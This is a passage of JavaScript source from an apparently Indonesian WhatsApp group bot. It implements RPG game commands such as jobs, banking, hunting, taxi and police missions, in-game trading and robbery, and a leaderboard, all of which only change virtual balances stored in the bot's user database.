            "becak",
            "sepeda",
          ];
          let bengkel = bengke[Math.floor(Math.random() * bengke.length)];

          let ruma = [
            "Membangun Rumah",
            "Membangun Gedung",
            "Memperbaiki Rumah",
            "Memperbaiki Gedung",
            "Membangun Fasilitas Umum",
            "Memperbaiki Fasilitas Umum",
          ];
          let rumah = ruma[Math.floor(Math.random() * ruma.length)];

          if (/kerja/i.test(command)) {
            switch (type) {
              case "ojek":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim();
                users.money += hasilojek * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ${global.rpg.emoticon(
                    "money"
                  )}*`
                );
                break;

              case "pedagang":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasildagang = `${Math.floor(
                  Math.random() * 150000
                )}`.trim();
                users.money += hasildagang * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ${global.rpg.emoticon(
                    "money"
                  )}*`
                );
                break;

              case "dokter":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasildokter = `${Math.floor(
                  Math.random() * 150000
                )}`.trim();
                users.money += hasildokter * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ${global.rpg.emoticon(
                    "money"
                  )}`
                );
                break;

              case "petani":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim();
                users.money += hasiltani * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ${global.rpg.emoticon(
                    "money"
                  )}*`
                );
                break;

              case "montir":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasilmontir = `${Math.floor(
                  Math.random() * 150000
                )}`.trim();
                users.money += hasilmontir * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ${global.rpg.emoticon(
                    "money"
                  )}`
                );
                break;

              case "kuli":
                if (new Date() - users.lastkerja < 300000)
                  return reply(
                    `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(
                      time - new Date()
                    )}`
                  );
                let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim();
                users.money += hasilkuli * 1;
                users.lastparming = new Date() * 1;
                reply(
                  `Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon(
                    "money"
                  )}*`
                );
                break;
              default:
                return reply(
                  `_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`
                );
            }
          }
        }
        break;

      case "bankcek":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let who =
            m.mentionedJid && m.mentionedJid[0]
              ? m.mentionedJid[0]
              : m.fromMe
              ? Kilianhst.user.jid
              : m.sender;
          if (!(who in db.data.users))
            return reply(`User ${who} not in database`);
          let user = db.data.users[who];
          let isMods = global.owner
            .filter(([number, _, isOwner]) => number && isOwner)
            .map(([number]) => number)
            .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
            .includes(who);
          let isPrems = isOwner || new Date() - user.premiumTime < 0;
          let caption = `
▧「 *BANK CEK* 」
┃ •  👤 Name: ${user.registered ? user.name : Kilhst.getName(m.sender)}
┃ •  ${global.rpg.emoticon("atm")} Atm: ${
            user.atm > 0 ? "Level " + user.atm : "✖️"
          }
┃ •  ${global.rpg.emoticon("bank")} Bank: ${user.bank} / ${user.fullatm}
┃ •  ${global.rpg.emoticon("money")} Money: ${user.money}
┃ •  ${global.rpg.emoticon("chip")} Chip: ${user.chip}
┃ •  🤖 Robo: ${user.robo > 0 ? "Level " + user.robo : "✖️"}
┃ •  🌟 Status: ${
            isMods
              ? "Developer"
              : isOwner
              ? "Owner"
              : isPrems
              ? "Premium User ✅"
              : user.level > 999
              ? "Elite User"
              : "Free User"
          }
┃ •  📑 Registered: ${user.registered ? "Yes" : "No"}
└────···
`.trim();
          reply(`${caption}`);
        }
        break;

      case "bansos":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function pickRandom(list) {
            return list[Math.floor(Math.random() * list.length)];
          }

          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s]
              .map((v) => v.toString().padStart(2, "0"))
              .join(":");
          }

          let user = db.data.users[m.sender];
          let randomaku = Math.floor(Math.random() * 101);
          let randomkamu = Math.floor(Math.random() * 101);
          let __timers = new Date() - user.lastbansos;
          let _timers = 360 - __timers;
          let timers = clockString(_timers);

          if (user.money < 1000) {
            return reply(
              `Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`
            );
          }

          if (new Date() - user.lastbansos > 300000) {
            if (randomaku > randomkamu) {
              user.money -= 3000000;
              user.lastbansos = new Date() * 1;
              return Kilianhst.sendMessage(m.chat, {
                image: {
                  url: "https://telegra.ph/file/afcf9a7f4e713591080b5.jpg",
                },
                caption: `Kamu Tertangkap Setelah Kamu korupsi dana bansos🕴️💰,Dan Kamu harus membayar denda 3 Juta rupiah💵`,
              });
            } else if (randomaku < randomkamu) {
              user.money += 3000000;
              user.lastbansos = new Date() * 1;
              return Kilianhst.sendMessage(m.chat, {
                image: {
                  url: "https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg",
                },
                caption: `Kamu berhasil korupsi dana bansos🕴️💰,Dan Kamu mendapatkan 3 Juta rupiah💵`,
              });
            } else {
              user.lastbansos = new Date() * 1;
              return reply(
                `Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`
              );
            }
          } else {
            return reply(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
          }
        }
        break;

      case "taxy":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let order = db.data.users[m.sender].ojekk;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Taxy";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (new Date() - user.lastmisi > 3600000) {
            let randomaku1 = Math.floor(Math.random() * 1000000);
            let randomaku2 = Math.floor(Math.random() * 10000);

            var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚕


✔️ Mendapatkan orderan....
`.trim();

            var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳🌳 🏘️🏘️🏡


🚖 Mengantar Ke tujuan.....
`.trim();

            var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳🌳 🏘️


🚖 Selesai Mengantar Pelanggan....
`.trim();

            var dimas4 = `
➕ 💹Menerima gaji....
`.trim();

            var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 💹 Uang = [ ${randomaku1} ]
➕ ✨ Exp = [ ${randomaku2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim();

            user.money += randomaku1;
            user.exp += randomaku2;
            user.ojekk += 1;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];

            setTimeout(() => {
              reply(`${hsl}`);
            }, 27000);

            setTimeout(() => {
              reply(`${dimas4}`);
            }, 25000);

            setTimeout(() => {
              reply(`${dimas3}`);
            }, 20000);

            setTimeout(() => {
              reply(`${dimas2}`);
            }, 15000);

            setTimeout(() => {
              reply(`${dimas}`);
            }, 10000);

            setTimeout(() => {
              reply("🔍Mencari pelanggan.....");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "leaderboard":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk Memulai Rpg Game Ketik .joinrpg Dan Untuk Keluar Game Ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);

          const { areJidsSameUser } = require("@adiwajshing/baileys");
          const participants = await Kilianhst.groupMetadata(m.chat).then(
            (a) => a.participants
          );

          const leaderboards = [
            "level",
            "exp",
            "limit",
            "money",
            "iron",
            "gold",
            "diamond",
            "emerald",
            "trash",
            "joinlimit",
            "potion",
            "petFood",
            "wood",
            "rock",
            "string",
            "common",
            "uncommon",
            "mythic",
            "legendary",
            "pet",
            "bank",
            "chip",
            "skata",
          ];

          function sort(prop, asc = true) {
            return (a, b) =>
              asc
                ? (a[prop] || 0) - (b[prop] || 0)
                : (b[prop] || 0) - (a[prop] || 0);
          }
          function toNumber(prop, def = 0) {
            return (user, i, arr) => ({ ...arr[i], [prop]: user[prop] ?? def });
          }
          function enumGetKey(a) {
            return a.jid;
          }
          function isNumber(x) {
            let n = parseInt(x);
            return !isNaN(n) ? n : false;
          }

          let users = Object.entries(db.data.users).map(([jid, data]) => ({
            ...data,
            jid,
          }));
          let type = (args[0] || "").toLowerCase();
          let leaderboard = leaderboards.filter((v) => users.some((u) => u[v]));
          let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map((v) => `⮕ ${rpg.emoticon(v)} - ${v}`).join("\n")}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ: ${command} [type]
★ ᴇxᴀᴍᴩʟᴇ: ${command} legendary`;
          if (!leaderboard.includes(type))
            return reply("*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n" + wrong);

          let page = isNumber(args[1]) || 0;
          let sorted = users.map(toNumber(type)).sort(sort(type, false));
          let userRanks = sorted.map(enumGetKey);
          let teks = `
🏆 Rank Kamu: ${userRanks.indexOf(m.sender) + 1} Dari ${userRanks.length}

*• ${rpg.emoticon(type)} ${type} •*

${await Promise.all(
  sorted.slice(page * 5, page * 5 + 5).map(async (u, i) => {
    let name = u.registered ? u.name : await Kilianhst.getName(u.jid);
    let fromGroup = participants.some((p) => areJidsSameUser(p.id, u.jid));
    return `${i + 1}.*﹙${u[type]}﹚* - ${
      fromGroup
        ? `${name} \nwa.me/${u.jid.split("@")[0]}`
        : "ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n@" + u.jid.split("@")[0]
    }`;
  })
)}`.trim();

          reply(teks, {
            contextInfo: {
              mentionedJid: sorted
                .slice(page * 5, page * 5 + 5)
                .map((u) => u.jid)
                .filter(
                  (j) => !participants.some((p) => areJidsSameUser(p.id, j))
                ),
            },
          });
        }
        break;

      case "mulung":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
              seconds = Math.floor((duration / 1000) % 60),
              minutes = Math.floor((duration / (1000 * 60)) % 60),
              hours = Math.floor((duration / (1000 * 60 * 60)) % 24);
            hours = hours < 10 ? "0" + hours : hours;
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;
            return hours + " jam " + minutes + " menit " + seconds + " detik";
          }
          let user = db.data.users[m.sender];
          let time = user.lastmulung + 1800000;

          if (new Date() - user.lastmulung < 1800000)
            return reply(
              `Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(
                time - new Date()
              )} lagi`
            );

          let botol = Math.floor(Math.random() * 1000);
          let kaleng = Math.floor(Math.random() * 1000);
          let kardus = Math.floor(Math.random() * 1000);
          let gelas = Math.floor(Math.random() * 1000);
          let plastik = Math.floor(Math.random() * 1000);

          user.botol += botol * 1;
          user.kaleng += kaleng * 1;
          user.kardus += kardus * 1;
          user.gelas += gelas * 1;
          user.plastik += plastik * 1;
          user.lastmulung = new Date() * 1;

          reply(
            `Selamat kamu mendapatkan : \n+${botol} Botol\n+${kaleng} Kaleng\n+${kardus} Kardus\n+${gelas} Gelas\n+${plastik} Plastik`
          );
        }
        break;

      case "berburu":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            console.log({ ms, h, m, s });
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Berburu";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            return reply(
              `Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`
            );
          }
          if (new Date() - user.lastmisi > 3600000) {
            let hewan1 = Math.floor(Math.random() * 10);
            let hewan2 = Math.floor(Math.random() * 10);
            let hewan3 = Math.floor(Math.random() * 10);
            let hewan4 = Math.floor(Math.random() * 10);
            let hewan5 = Math.floor(Math.random() * 10);
            let hewan6 = Math.floor(Math.random() * 10);
            let hewan7 = Math.floor(Math.random() * 10);
            let hewan8 = Math.floor(Math.random() * 10);
            let hewan9 = Math.floor(Math.random() * 10);
            let hewan10 = Math.floor(Math.random() * 10);
            let hewan11 = Math.floor(Math.random() * 10);
            let hewan12 = Math.floor(Math.random() * 10);

            let hsl = `🕸 *Hasil Berburu ${
              user.registered ? user.name : Kilianhst.getName(m.sender)
            }* 
${
  hewan1
    ? `
🐂 Banteng: ${hewan1}`
    : ""
} ${
              hewan2
                ? `
🐅 Harimau: ${hewan2}`
                : ""
            } ${
              hewan3
                ? `
🐘 Gajah: ${hewan3}`
                : ""
            } ${
              hewan4
                ? `
🐐 Kambing: ${hewan4}`
                : ""
            } ${
              hewan5
                ? `
🐼 Panda: ${hewan5}`
                : ""
            } ${
              hewan6
                ? `
🐊 Buaya: ${hewan6}`
                : ""
            } ${
              hewan7
                ? `
🐃 Kerbau: ${hewan7}`
                : ""
            } ${
              hewan8
                ? `
🐮 Sapi: ${hewan8}`
                : ""
            } ${
              hewan9
                ? `
🐒 Monyet: ${hewan9}`
                : ""
            } ${
              hewan10
                ? `
🐗 Babi Hutan: ${hewan10}`
                : ""
            } ${
              hewan11
                ? `
🐖 Babi: ${hewan11}`
                : ""
            } ${
              hewan12
                ? `
🐓 Ayam: ${hewan12}`
                : ""
            }
`.trim();

            user.banteng += hewan1;
            user.harimau += hewan2;
            user.gajah += hewan3;
            user.kambing += hewan4;
            user.panda += hewan5;
            user.buaya += hewan6;
            user.kerbau += hewan7;
            user.sapi += hewan8;
            user.monyet += hewan9;
            user.babihutan += hewan10;
            user.babi += hewan11;
            user.ayam += hewan12;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 20000),
            ];

            setTimeout(() => {
              reply(`${hsl}`);
            }, 20000);

            setTimeout(() => {
              reply(`Nah ini dia`);
            }, 18000);

            setTimeout(() => {
              reply("Dorr🔥");
            }, 15000);

            setTimeout(() => {
              reply("Dapat Sasaran");
            }, 14000);

            setTimeout(() => {
              reply("Sedang mencari mangsa...");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "polisi":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            console.log({ ms, h, m, s });
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let order = db.data.users[m.sender].ojekk;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Polisi";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (new Date() - db.data.users[m.sender].lastmisi > 3600000) {
            let randomaku1 = Math.floor(Math.random() * 10);
            let randomaku2 = Math.floor(Math.random() * 10);

            let rbrb1 = randomaku1 * 100000;
            let rbrb2 = randomaku2 * 1000;

            var dimas = `
👮Mengejar Pencuri....
`.trim();

            var dimas2 = `
👮Menangkap pencuri....
`.trim();

            var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`.trim();

            var dimas4 = `
➕ 💹Menerima gaji....
`.trim();

            var hsl = `
*—[ Hasil Polisi ${name} ]—*
➕ 💹 Uang = [ ${rbrb1} ]
➕ ✨ Exp = [ ${rbrb2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim();

            user.money += rbrb1;
            user.exp += rbrb2;
            user.ojekk += 1;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];

            setTimeout(() => {
              reply(`${hsl}`);
            }, 27000);

            setTimeout(() => {
              reply(`${dimas4}`);
            }, 25000);

            setTimeout(() => {
              reply(`${dimas3}`);
            }, 20000);

            setTimeout(() => {
              reply(`${dimas2}`);
            }, 15000);

            setTimeout(() => {
              reply(`${dimas}`);
            }, 10000);

            setTimeout(() => {
              reply("??Sedang Berpatroli.....");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      // let pajak = 0.02
      case "berdagang":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            console.log({ ms, h, m, s });
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }

          let dapat = Math.floor(Math.random() * 5000);
          let who;
          if (m.isGroup) who = m.mentionedJid[0];
          else who = m.chat;
          if (!who)
            return reply(
              "Tag salah satu lah, yang kamu ingin berdagang bareng"
            );
          if (typeof db.data.users[who] == "undefined")
            return reply("Pengguna tidak ada didalam data base");
          let __timers = new Date() - db.data.users[m.sender].lastdagang;
          let _timers = 28800000 - __timers;
          let timers = clockString(_timers);
          let users = db.data.users;
          let username = Kilianhst.getName(who);
          if (new Date() - db.data.users[m.sender].lastdagang > 28800000) {
            if (4999 > users[who].money)
              return reply(
                "Target tidak memiliki modal harap masukkan modal 5000"
              );
            if (4999 > users[m.sender].money)
              return reply(
                "kamu tidak memiliki modal harap masukkan modal 5000"
              );
            users[who].money -= dapat * 1;
            users[m.sender].money -= dapat * 1;
            db.data.users[m.sender].lastdagang = new Date() * 1;
            reply(
              `Mohon tunggu kak..\nKamu dan @${who.replace(
                /@.+/,
                ""
              )} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(
                /@.+/,
                ""
              )} meletakkan modal -${dapat} ðŸ˜…`
            );
            setTimeout(() => {
              reply(
                m.chat,
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                m,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 3600000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 7200000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 10800000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 14400000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 18000000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 21600000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${(users[
                  m.sender
                ].money += 50000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +50000\n${(users[
                  who
                ].money += 50000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 25200000);
            setTimeout(() => {
              reply(
                `Selamat kamu dan @${who.replace(
                  /@.+/,
                  ""
                )} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +10000\n${(users[
                  m.sender
                ].money += 10000)} Money kamu\n\nPenghasilan dagang @${who.replace(
                  /@.+/,
                  ""
                )} didapatkan +100000\n${(users[
                  who
                ].money += 100000)} Money @${who.replace(/@.+/, "")}`,
                {
                  contextInfo: {
                    mentionedJid: [m.sender, who],
                  },
                }
              );
            }, 28800000);
          } else reply(`Anda Sudah Berdagang , tunggu ${timers} lagi..`);
        }
        break;

      case "merampok":
      case "rampok":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);

          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let dapat = Math.floor(Math.random() * 100000);
          let users = db.data.users;
          let who =
            m.mentionedJid && m.mentionedJid[0]
              ? m.mentionedJid[0]
              : m.quoted && m.quoted.sender;
          if (!who) return reply("Tag orang yang mau kamu Rampok!");
          if (users[who].level > users[m.sender].level)
            return reply(
              `Level kamu harus lebih tinggi dari @${
                who.split("@")[0]
              } Untuk bisa merampoknya!`,
              false,
              { mentions: [who] }
            );
          let __timers = new Date() - db.data.users[m.sender].lastrampok;
          let _timers = 3600000 - __timers;
          let timers = clockString(_timers);
          if (new Date() - db.data.users[m.sender].lastrampok > 3600000) {
            if (10000 > users[who].money)
              return reply("ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ");
            users[who].money -= dapat * 1;
            users[m.sender].money += dapat * 1;
            db.data.users[m.sender].lastrampok = new Date() * 1;
            reply(`ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`);
          } else
            reply(
              `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`
            );
        }
        break;

      case "banknabung":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (!q)
            return reply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditabung*_

- _*${prefix}${command} jumlah*_
- _*${prefix}${command} all*_

\`${prefix}${command} 10000\``);
          const xpperlimit = 1;
          let user = db.data.users[m.sender];
          count = q.toLowerCase() === "all" ? user.money : parseInt(q);
          count = Math.min(user.money, count);
          if (count <= 0)
            return reply("Kamu tidak memiliki cukup uang untuk menabung.");
          if (user.atm == 0) return reply("kamu belum mempunyai kartu ATM");
          if (user.bank > user.fullatm)
            return reply("Uang Di ATM sudah penuh!");
          if (count > user.fullatm - user.bank)
            return reply("Uangnya nya sudah mencapai batas");
          if (user.money >= xpperlimit * count) {
            user.money -= xpperlimit * count;
            user.bank += count;
            reply(`Sukses menabung sebesar ${count} Money 💹`);
          } else {
            return;
          }
        }
        break;

      case "banktarik":
